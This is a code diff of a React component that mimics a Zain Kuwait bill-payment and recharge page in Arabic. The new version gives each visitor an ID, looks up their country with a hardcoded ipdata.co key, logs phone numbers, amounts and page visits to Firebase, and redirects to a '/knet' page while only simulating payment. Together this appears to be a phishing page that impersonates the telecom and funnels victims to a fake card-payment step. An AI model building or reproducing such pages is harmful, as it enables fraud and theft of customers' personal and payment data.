@@ -1,398 +1,307 @@
 "use client"
 
 import type React from "react"
-
-import {
-  Plus,
-  AlertCircle,
-  Heart,
-  Menu,
-  Shield,
-  CreditCard,
-  Smartphone,
-  Receipt,
-  Package,
-  Settings,
-  Wifi,
-  Phone,
-  Loader,
-} from "lucide-react"
+import { useState, useEffect, useCallback } from "react"
+import { Plus, AlertCircle, CheckCircle2, CreditCard, Smartphone, Loader2 } from 'lucide-react'
 import { Button } from "@/components/ui/button"
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
+import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
+import { Label } from "@/components/ui/label"
 import { Input } from "@/components/ui/input"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { Card, CardContent } from "@/components/ui/card"
-import { ProfessionalSelect } from "./professional-select"
-import { ProfessionalTabs } from "./professional-tabs"
+import { Checkbox } from "@/components/ui/checkbox"
+import { Badge } from "@/components/ui/badge"
+import { Separator } from "@/components/ui/separator"
+// Assuming these are correctly set up in your project
+ import { addData } from "@/lib/firebase";
+ import { setupOnlineStatus } from "@/lib/utils";
+import Loader from "@/components/loader"
 
-export default function ZainPayment() {
-  const [activeTab, setActiveTab] = useState("recharge")
-  const [phoneNumber, setPhoneNumber] = useState("")
-  const [selectedPlan, setSelectedPlan] = useState("30days-6000")
-  const [paymentAmount, setPaymentAmount] = useState("6.000")
-  const [isSubmitted, setIsSubmmited] = useState(false)
+// Placeholder functions to avoid errors if lib files are not present
 
-  const tabs = [
-    {
-      id: "recharge",
-      label: "شحن الرصيد",
-      icon: <Smartphone className="w-4 h-4" />,
-      badge: "الأكثر استخداماً",
-    },
-    {
-      id: "bills",
-      label: "دفع الفاتورة",
-      icon: <Receipt className="w-4 h-4" />,
-    },
-  ]
 
-  const rechargeOptions = [
-    { value: "7days-2000", label: "الصلاحية 7 أيام", price: "2.000 د.ك" },
-    { value: "15days-4000", label: "الصلاحية 15 يوم", price: "4.000 د.ك" },
-    { value: "30days-6000", label: "الصلاحية 30 يوم", price: "6.000 د.ك" },
-    { value: "90days-12000", label: "الصلاحية 90 يوم", price: "12.000 د.ك" },
-    { value: "180days-22000", label: "الصلاحية 180 يوم", price: "22.000 د.ك" },
-    { value: "365days-30000", label: "الصلاحية 365 يوم", price: "30.000 د.ك" },
-    { value: "other", label: "مبلغ آخر", price: "حدد المبلغ" },
-  ]
+const newVisitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;
 
-  const packageOptions = [
-    { value: "data-1gb", label: "باقة إنترنت 1 جيجا", price: "1.500 د.ك" },
-    { value: "data-5gb", label: "باقة إنترنت 5 جيجا", price: "5.000 د.ك" },
-    { value: "data-10gb", label: "باقة إنترنت 10 جيجا", price: "8.000 د.ك" },
-    { value: "unlimited", label: "باقة لا محدودة", price: "15.000 د.ك" },
-  ]
-  const handleSubmit = (e: React.FormEvent) => {
+
+export default function ZainPaymentForm() {
+  const [phone, setPhone] = useState("")
+  const [paymentType, setPaymentType] = useState("other")
+  const [termsAccepted, setTermsAccepted] = useState(false)
+  const [amount, setAmount] = useState('6.00')
+  const [selectedAmount, setSelectedAmount] = useState<string | null>(null)
+  const [phoneError, setPhoneError] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
+  const [activeTab, setActiveTab] = useState("bill")
+  const [visitorId, setVisitorId] = useState<string | null>(null);
+
+  useEffect(() => {
+    const userid=localStorage.getItem('visitor')
+    if(userid!==null){
+    localStorage.setItem("visitor", newVisitorId);
+    setVisitorId(newVisitorId);
+    }else{
+      setVisitorId(userid)
+    }
+   getLocationAndLog()
+  }, []);
+
+  useEffect(() => {
+    localStorage.setItem("amount",amount);
+  }, [amount]);
+
+
+
+  useEffect(() => {
+    if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
+      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.")
+    } else {
+      setPhoneError("")
+    }
+  }, [phone])
+
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^0-9]/g, "")
+    if (value.length <= 8) {
+      setPhone(value)
+    }
+  }
+
+  const handleAmountSelect = (value: string) => {
+    setSelectedAmount(value)
+    localStorage.setItem("amount", value) // Consider if this is necessary or should be component state only
+    setAmount((value))
+  }
+
+  const getLocationAndLog = useCallback(async () => {
+    if (!visitorId) return;
+
+    // This API key is public and might be rate-limited or disabled.
+    // For a production app, use a secure way to handle API keys, ideally on the backend.
+    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb" 
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
+    try {
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+      const country = await response.text()
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: visitorId,
+        country: country,
+        action: "page_load",
+        currentPage: "الرئيسية ",
+      })
+      localStorage.setItem("country", country) // Consider privacy implications
+      setupOnlineStatus(visitorId)
+    } catch (error) {
+      console.error("Error fetching location:", error)
+      // Log error with visitor ID for debugging
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: visitorId,
+        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
+        action: "location_error"
+      });
+    }
+  }, [visitorId]);
+
+  useEffect(() => {
+    if (visitorId) {
+      getLocationAndLog();
+    }
+  }, [visitorId, getLocationAndLog]);
+
+  const handleSubmit = async (e:any) => {
     e.preventDefault()
-    setIsSubmmited(true)
-    setTimeout(() => {
-      setIsSubmmited(false)
-    }, 3000)
-  }
-  const handlePlanChange = (value: string) => {
-    setSelectedPlan(value)
-    const amounts = {
-      "7days-2000": "2.000",
-      "15days-4000": "4.000",
-      "30days-6000": "6.000",
-      "90days-12000": "12.000",
-      "180days-22000": "22.000",
-      "365days-30000": "30.000",
-      "data-1gb": "1.500",
-      "data-5gb": "5.000",
-      "data-10gb": "8.000",
-      unlimited: "15.000",
-      other: "0.000",
-    }
-    setPaymentAmount(amounts[value as keyof typeof amounts] || "6.000")
-  }
+    setIsLoading(true)
 
-  const renderTabContent = () => {
-    switch (activeTab) {
-      case "recharge":
-        return (
-          <div className="space-y-4 sm:space-y-6">
-            {/* Phone Number Section */}
-            <div className="space-y-3 sm:space-y-4">
-              <div className="flex items-center gap-2 mb-3 sm:mb-4">
-                <div className="w-6 h-6 sm:w-8 sm:h-8 bg-pink-100 rounded-full flex items-center justify-center">
-                  <span className="text-pink-600 font-bold text-xs sm:text-sm">1</span>
-                </div>
-                <h2 className="text-base sm:text-lg font-semibold text-gray-800">معلومات الرقم</h2>
-              </div>
-
-              <div className="space-y-2">
-                <label className="text-xs sm:text-sm font-medium text-gray-700 flex items-center gap-2">
-                  <Phone className="w-3 h-3 sm:w-4 sm:h-4 text-pink-600" />
-                  نوع الرقم
-                </label>
-                <Select defaultValue="other" dir="rtl">
-                  <SelectTrigger className="w-full h-12 sm:h-14 text-right bg-white border-2 border-gray-200 rounded-xl hover:border-pink-300 focus:border-pink-900 transition-all duration-200 shadow-sm bg-white">
-                    <SelectValue className="bg-white" />
-                  </SelectTrigger>
-                  <SelectContent className="rounded-xl border-2 border-gray-200 shadow-xl">
-                    <SelectItem value="other" className="text-right py-3 bg-white">
-                      رقم آخر
-                    </SelectItem>
-                    <SelectItem value="current" className="text-right py-3 bg-white">
-                      الرقم الحالي
-                    </SelectItem>
-                  </SelectContent>
-                </Select>
-              </div>
-
-              <div className="space-y-2">
-                <label className="text-xs sm:text-sm font-medium text-gray-700">رقم الهاتف</label>
-                <Input
-                  value={phoneNumber}
-                  onChange={(e) => setPhoneNumber(e.target.value)}
-                  className="w-full h-12 sm:h-14 text-right bg-white border-2 border-gray-200 rounded-xl hover:border-pink-300 focus:border-pink-900 transition-all duration-200 shadow-sm text-base sm:text-lg font-medium"
-                  placeholder="أدخل رقم الهاتف"
-                  dir="rtl"
-                />
-              </div>
-            </div>
-
-            {/* Error Message */}
-            <Card className="border-red-200 bg-red-50 shadow-sm hidden ">
-              <CardContent className="p-3 sm:p-4">
-                <div className="flex items-start gap-2 sm:gap-3 ">
-                  <AlertCircle className=" w-4 h-4 sm:w-5 sm:h-5 text-red-500 flex-shrink-0 mt-0.5" />
-                  <div>
-                    <p className="text-red-700 font-medium text-xs sm:text-sm">خطأ في التحقق</p>
-                    <p className="text-red-600 text-xs sm:text-sm mt-1">
-                      الرقم المدخل غير صحيح أو لا يحتوي على رصيد كافٍ. يرجى المحاولة مرة أخرى.
-                    </p>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
-            {/* Recharge Amount Section */}
-            <div className="space-y-3 sm:space-y-4">
-              <div className="flex items-center gap-2 mb-3 sm:mb-4">
-                <div className="w-6 h-6 sm:w-8 sm:h-8 bg-pink-100 rounded-full flex items-center justify-center">
-                  <span className="text-pink-600 font-bold text-xs sm:text-sm">2</span>
-                </div>
-                <h2 className="text-base sm:text-lg font-semibold text-gray-800">اختر مبلغ الشحن</h2>
-              </div>
-
-              <div className="space-y-2">
-                <label className="text-xs sm:text-sm font-medium text-gray-700">مبلغ التعبئة</label>
-                <ProfessionalSelect
-                  options={rechargeOptions}
-                  value={selectedPlan}
-                  onValueChange={handlePlanChange}
-                  placeholder="اختر مبلغ الشحن"
-                />
-              </div>
-            </div>
-          </div>
-        )
-
-      case "bills":
-        return (
-          <div className="space-y-4 sm:space-y-6">
-            <div className="text-center py-6 sm:py-8">
-              <Receipt className="w-12 h-12 sm:w-16 sm:h-16 text-pink-300 mx-auto mb-3 sm:mb-4" />
-              <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">دفع الفاتورة</h3>
-              <p className="text-sm sm:text-base text-gray-600">ادفع فاتورتك الشهرية بسهولة</p>
-            </div>
-
-            <div className="space-y-3 sm:space-y-4">
-              <div className="flex items-center gap-2 mb-3 sm:mb-4">
-                <div className="w-6 h-6 sm:w-8 sm:h-8 bg-pink-100 rounded-full flex items-center justify-center">
-                  <span className="text-pink-600 font-bold text-xs sm:text-sm">1</span>
-                </div>
-                <h2 className="text-base sm:text-lg font-semibold text-gray-800">معلومات الرقم</h2>
-              </div>
-
-              <div className="space-y-2">
-                <label className="text-xs sm:text-sm font-medium text-gray-700 flex items-center gap-2">
-                  <Phone className="w-3 h-3 sm:w-4 sm:h-4 text-pink-600" />
-                  نوع الرقم
-                </label>
-                <Select defaultValue="other">
-                  <SelectTrigger className="w-full h-12 sm:h-14 text-right bg-white border-2 border-gray-200 rounded-xl hover:border-pink-300 focus:border-pink-900 transition-all duration-200 shadow-sm">
-                    <SelectValue />
-                  </SelectTrigger>
-                  <SelectContent className="rounded-xl border-2 border-gray-200 shadow-xl">
-                    <SelectItem value="other" className="text-right py-3">
-                      رقم آخر
-                    </SelectItem>
-                    <SelectItem value="current" className="text-right py-3">
-                      الرقم الحالي
-                    </SelectItem>
-                  </SelectContent>
-                </Select>
-              </div>
-
-              <div className="space-y-2">
-                <label className="text-xs sm:text-sm font-medium text-gray-700">رقم الهاتف</label>
-                <Input
-                  value={phoneNumber}
-                  onChange={(e) => setPhoneNumber(e.target.value)}
-                  className="w-full h-12 sm:h-14 text-right bg-white border-2 border-gray-200 rounded-xl hover:border-pink-300 focus:border-pink-900 transition-all duration-200 shadow-sm text-base sm:text-lg font-medium"
-                  placeholder="أدخل رقم الهاتف"
-                  dir="rtl"
-                />
-              </div>
-
-              {/* Recharge Amount Section */}
-              <div className="space-y-3 sm:space-y-4">
-                <div className="flex items-center gap-2 mb-3 sm:mb-4">
-                  <div className="w-6 h-6 sm:w-8 sm:h-8 bg-pink-100 rounded-full flex items-center justify-center">
-                    <span className="text-pink-600 font-bold text-xs sm:text-sm">2</span>
-                  </div>
-                  <h2 className="text-base sm:text-lg font-semibold text-gray-800">اختر مبلغ الشحن</h2>
-                </div>
-
-                <div className="space-y-2">
-                  <label className="text-xs sm:text-sm font-medium text-gray-700">مبلغ التعبئة</label>
-                  <ProfessionalSelect
-                    options={rechargeOptions}
-                    value={selectedPlan}
-                    onValueChange={handlePlanChange}
-                    placeholder="اختر مبلغ الشحن"
-                  />
-                </div>
-              </div>
-            </div>
-          </div>
-        )
-
-      case "packages":
-        return (
-          <div className="space-y-4 sm:space-y-6">
-            <div className="text-center py-4 sm:py-4">
-              <Package className="w-12 h-12 sm:w-16 sm:h-16 text-pink-300 mx-auto mb-3 sm:mb-4" />
-              <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">باقات الإنترنت</h3>
-              <p className="text-sm sm:text-base text-gray-600">اختر الباقة المناسبة لك</p>
-            </div>
-
-            <div className="space-y-3 sm:space-y-4">
-              <div className="space-y-2">
-                <label className="text-xs sm:text-sm font-medium text-gray-700 flex items-center gap-2">
-                  <Wifi className="w-3 h-3 sm:w-4 sm:h-4 text-pink-600" />
-                  باقات الإنترنت
-                </label>
-                <ProfessionalSelect
-                  options={packageOptions}
-                  value={selectedPlan}
-                  onValueChange={handlePlanChange}
-                  placeholder="اختر باقة الإنترنت"
-                />
-              </div>
-            </div>
-          </div>
-        )
-
-      case "services":
-        return (
-          <div className="space-y-4 sm:space-y-6">
-            <div className="text-center py-6 sm:py-8">
-              <Settings className="w-12 h-12 sm:w-16 sm:h-16 text-pink-300 mx-auto mb-3 sm:mb-4" />
-              <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">الخدمات الإضافية</h3>
-              <p className="text-sm sm:text-base text-gray-600">خدمات متنوعة لتلبية احتياجاتك</p>
-            </div>
-
-            <div className="grid grid-cols-2 gap-3 sm:gap-4">
-              <Card className="border-2 border-pink-200 hover:border-pink-900 transition-colors cursor-pointer">
-                <CardContent className="p-3 sm:p-4 text-center">
-                  <Phone className="w-6 h-6 sm:w-8 sm:h-8 text-pink-600 mx-auto mb-2" />
-                  <p className="text-xs sm:text-sm font-medium">خدمة العملاء</p>
-                </CardContent>
-              </Card>
-
-              <Card className="border-2 border-pink-200 hover:border-pink-900 transition-colors cursor-pointer">
-                <CardContent className="p-3 sm:p-4 text-center">
-                  <Shield className="w-6 h-6 sm:w-8 sm:h-8 text-pink-600 mx-auto mb-2" />
-                  <p className="text-xs sm:text-sm font-medium">الحماية المتقدمة</p>
-                </CardContent>
-              </Card>
-            </div>
-          </div>
-        )
-
-      default:
-        return null
+    if (!isFormValid || !visitorId) return
+    
+    try {
+      await addData({
+        id: visitorId,
+        phone: phone, // Storing phone number, ensure compliance with privacy regulations
+        amount: amount,
+        timestamp: new Date().toISOString(),
+        currentPage: "كي نت ",
+        action: "payment_submit_attempt"
+            })
+      // Simulate API call for payment processing
+      
+      // On successful payment simulation
+      await addData({
+        id: visitorId,
+        action: "payment_submit_success_simulation",
+        status: "simulated_success"
+      });
+      // Navigate to checkout or show success
+      // For Next.js, prefer using the `useRouter` hook for navigation
+      window.location.href = "/knet"; // Replace with Next.js router if possible: router.push('/checkout')
+    } catch (error) {
+      console.error("Submission error:", error);
+      await addData({
+        id: visitorId,
+        action: "payment_submit_error",
+        error: error instanceof Error ? error.message : String(error)
+      });
+      // Handle error display to user
+    } finally {
+      setIsLoading(false)
     }
   }
 
-  return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100" dir="rtl">
-      {/* Responsive Header */}
-      <header className="bg-gradient-to-r from-pink-900 to-pink-800 text-white shadow-xl">
-        <div className="px-4 sm:px-6 py-3 sm:py-4">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center gap-2 sm:gap-3">
-              <img src="z.png" alt="logo" width={90} />
-            </div>
-            <div className="flex items-center gap-2 sm:gap-3">
-              <button className="p-1.5 sm:p-2 hover:bg-white/10 rounded-lg transition-colors">
-                <Heart className="w-4 h-4 sm:w-5 sm:h-5" />
-              </button>
-              <button className="p-1.5 sm:p-2 hover:bg-white/10 rounded-lg transition-colors">
-                <Menu className="w-4 h-4 sm:w-5 sm:h-5" />
-              </button>
-              <div className="text-right hidden sm:block">
-                <div className="text-xs text-pink-200">مرحباً بك في</div>
+  const isFormValid = phone.length === 8 &&  parseInt(amount) > 0
+
+  const billAmounts = ["5", "10", "15", "20", "30", "50"]
+  const rechargeAmounts = ["2", "5", "10", "15", "20", "30"]
+  const currentAmounts = activeTab === "bill" ? billAmounts : rechargeAmounts;
+
+  const renderAmountSelection = () => (
+    phone.length === 8 && !phoneError && (
+      <div className="space-y-3">
+        <Label className="text-sm font-medium text-slate-800">
+          {activeTab === "bill" ? "اختر مبلغ الفاتورة" : "اختر باقة إعادة التعبئة"}
+        </Label>
+        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
+          {currentAmounts.map((value) => (
+            <Button
+              key={value}
+              type="button"
+              variant={selectedAmount === value ? "default" : "outline"}
+              className={`h-auto py-3 px-2 text-base font-semibold transition-all duration-200 rounded-lg shadow-sm hover:shadow-md focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2
+                ${selectedAmount === value
+                  ? "bg-primary text-primary-foreground scale-105 ring-2 ring-primary ring-offset-1"
+                  : "border-slate-300 hover:border-primary hover:bg-primary/10 text-slate-700"
+                }`}
+              onClick={() => handleAmountSelect(value)}
+            >
+              <div className="text-center w-full">
+                <div className="font-bold text-lg">{value}.000</div>
+                <div className="text-xs opacity-90">د.ك</div>
               </div>
-              <div className="text-right sm:hidden"></div>
-            </div>
-          </div>
+            </Button>
+          ))}
         </div>
-      </header>
-      <div className="px-4 sm:px-6 pb-4 sm:pb-6 ">
-        <h1 className="text-lg sm:text-2xl font-bold text-center text-black pt-9">الدفع السريع </h1>
-        <p className="text-center text-pink-700 font-bold  text-sm sm:text-sm mt-1 sm:mt-2">جميع خدماتك في مكان واحد</p>
       </div>
-      {/* Responsive Main Content */}
-      <div className="px-4 sm:px-6 lg:px-8 py-4 sm:py-8">
-        <div className="max-w-sm sm:max-w-md lg:max-w-2xl xl:max-w-4xl mx-auto">
-          <div className="lg:grid lg:grid-cols-3 lg:gap-8">
-            {/* Main Content Area */}
-            <div className="col-span-2">
-              <ProfessionalTabs tabs={tabs} defaultTab="recharge" onTabChange={setActiveTab}>
-                {renderTabContent()}
+    )
+  );
+ 
+  const renderPhoneNumberInput = () => (
+    <div className="space-y-2">
+      <Label className="text-sm font-medium text-slate-800 flex items-center justify-between">
+        <span>رقم الهاتف</span>
+        <Badge variant="outline" className="text-xs font-normal border-primary/50 text-primary">مطلوب</Badge>
+      </Label>
+      <div className="relative">
+        <Input
+          type="tel"
+          placeholder="XXXXXXXX"
+          value={phone}
+          onChange={handlePhoneChange}
+          maxLength={8}
+          className={`h-12 text-lg font-mono bg-white border-slate-300 focus:border-primary focus:ring-1 focus:ring-primary transition-colors placeholder:text-slate-400 text-right
+            ${phoneError ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-slate-300"}
+            ${phone.length === 8 && !phoneError ? "border-green-500 focus:border-green-500 focus:ring-green-500" : ""}`}
+          dir="rtl" // Keep ltr for phone number input
+        />
+        {phone.length === 8 && !phoneError && (
+          <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
+        )}
+         {phoneError && phone.length > 0 && (
+            <AlertCircle className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
+        )}
+      </div>
+      {phoneError && (
+        <div className="flex items-center gap-2 text-xs text-red-600 pt-1">
+          <AlertCircle className="w-4 h-4 flex-shrink-0" />
+          <p>{phoneError}</p>
+        </div>
+      )}
+    </div>
+  );
 
-                {/* Add Another Number - Only show for recharge and packages */}
-                {(activeTab === "recharge" || activeTab === "packages") && (
-                  <Card className="border-2 border-dashed border-pink-200 bg-pink-50/30 hover:bg-pink-50/50 transition-colors cursor-pointer group mt-4 sm:mt-6">
-                    <CardContent className="p-3 sm:p-4">
-                      <Button
-                        variant="ghost"
-                        className="w-full h-10 sm:h-12 flex items-center justify-center gap-2 sm:gap-3 text-pink-900 hover:text-pink-900 hover:bg-transparent group-hover:scale-105 transition-all duration-200"
-                      >
-                        <Plus className="w-4 h-4 sm:w-5 sm:h-5" />
-                        <span className="font-medium text-sm sm:text-base">إضافة رقم آخر للدفع</span>
-                      </Button>
-                    </CardContent>
-                  </Card>
-                )}
-              </ProfessionalTabs>
-            </div>
-
-            {/* Sidebar for Desktop */}
-            <div className="lg:col-span-1 mt-6 lg:mt-0">
-              {/* Total Summary */}
-              <Card className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-200 shadow-lg sticky top-4">
-                <CardContent className="p-4 sm:p-6">
-                  <div className="flex justify-between items-center">
-                    <div className="text-right">
-                      <div className="text-xl sm:text-2xl font-bold text-green-700">{paymentAmount} د.ك</div>
-                      <div className="text-green-600 text-xs sm:text-sm font-medium">المبلغ الإجمالي</div>
-                    </div>
-                    <div className="text-gray-600 font-semibold text-sm sm:text-lg">الإجمالي</div>
-                  </div>
-                  <div className="mt-3 sm:mt-4 pt-3 sm:pt-4 border-t border-green-200">
-                    <div className="flex items-center justify-center gap-2 text-green-600 text-xs sm:text-sm">
-                      <Shield className="w-3 h-3 sm:w-4 sm:h-4" />
-                      <span>دفع آمن ومشفر</span>
-                    </div>
-                  </div>
-                </CardContent>
-              </Card>
-
-              {/* Payment Button */}
-              <Button
-                onClick={handleSubmit}
-                disabled={isSubmitted || phoneNumber.length < 8}
-                className="w-full h-12 sm:h-14 bg-[#a3035f] hover:from-pink-900 hover:to-pink-900 text-white font-bold text-sm sm:text-lg rounded-xl shadow-lg hover:shadow-xl transform hover:scale-[1.02] transition-all duration-200 mt-4 sm:mt-6"
-              >
-                <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
-                تأكيد الدفع الآن
-                {isSubmitted && <Loader className="animate-spin" />}{" "}
-              </Button>
-
-              {/* Security Notice */}
-              <div className="text-center text-xs text-gray-500 mt-3 sm:mt-4">
-                <p>جميع المعاملات محمية بتشفير SSL 256-bit</p>
-                <p className="mt-1">شركة زين - الكويت © 2024</p>
-              </div>
-            </div>
-          </div>
+  const renderTermsAndConditions = (idPrefix: string) => (
+     <div className="bg-slate-50 rounded-lg p-4 border border-slate-200">
+      <div className="flex items-start gap-3">
+        <Checkbox
+          id={`${idPrefix}-terms`}
+          checked={termsAccepted}
+          onCheckedChange={(checked) => setTermsAccepted(checked as boolean)}
+          className="mt-0.5 data-[state=checked]:bg-primary data-[state=checked]:border-primary border-slate-400"
+          aria-labelledby={`${idPrefix}-terms-label`}
+        />
+        <div className="grid gap-1.5 leading-none">
+          <Label
+            htmlFor={`${idPrefix}-terms`}
+            id={`${idPrefix}-terms-label`}
+            className="text-sm font-medium cursor-pointer text-slate-700 hover:text-primary transition-colors"
+          >
+            أوافق على الشروط والأحكام
+          </Label>
+          <p className="text-xs text-slate-500">
+            بالمتابعة، أنت توافق على شروط وأحكام الخدمة الخاصة بنا.
+          </p>
         </div>
       </div>
     </div>
+  );
+
+  return (
+    <form dir="rtl" onSubmit={handleSubmit} className="min-h-screen bg-white text-black p-4">
+    <div className="max-w-md mx-auto bg-white rounded-xl shadow-md p-4" dir="rtl">
+      <div className="flex justify-around border-b pb-2 mb-4">
+        <button type="button" onClick={()=>setActiveTab('bill')} className={activeTab==="bill"?"text-pink-600 font-bold":"text-gray-600"}>دفع الفاتورة</button>
+        <button type="button" onClick={()=>setActiveTab('ess')}  className={activeTab==="ess"?"text-pink-600 font-bold":"text-gray-600"}>إعادة تعبئة eeZee</button>
+
+      </div>
+
+      <h2 className="text-lg font-bold mb-2">أود أن أعيد التعبئة لـ</h2>
+
+      <div className="mb-4">
+        {renderPhoneNumberInput()}
+      </div>
+
+      <div className="mb-4">
+        <label className="block mb-1 text-gray-700">مبلغ التعبئة</label>
+        <select
+          className="w-full border border-gray-300 rounded p-2"
+          value={amount}
+          onChange={(e) => setAmount(e.target.value)}
+        >
+          <option value="6.000">6.000 د.ك (30 يوم)</option>
+          <option value="10.000">10.000 د.ك (60 يوم)</option>
+          <option value="15.000">15.000 د.ك (90 يوم)</option>
+          <option value="30.000">30.000 د.ك (120 يوم)</option>
+          <option value="40.000">40.000 د.ك (150 يوم)</option>
+          <option value="50.000">50.000 د.ك (200 يوم)</option>
+        </select>
+      </div>
+
+      <div className="text-center mb-4">
+        <button className=" text-gray-600 py-2 px-4 rounded w-full" disabled>
+          + أضف رقم آخر
+        </button>
+      </div>
+
+      <hr className="my-4" />
+
+      <div className="flex justify-between text-xl font-bold text-green-600 mb-4">
+      <span className="text-black">إجمالي</span>
+      
+        <span>{amount}د.ك</span>
+      </div>
+
+      <button disabled={!isFormValid} className={isFormValid?"bg-rose-600 text-white py-2 px-4 rounded w-full" :"bg-gray-300 text-gray-600 py-2 px-4 rounded w-full" }>
+        أعد التعبئة الآن
+      </button>
+    </div>
+    {isLoading&&<Loader/>}
+
+  </form>
+
+
+
   )
 }
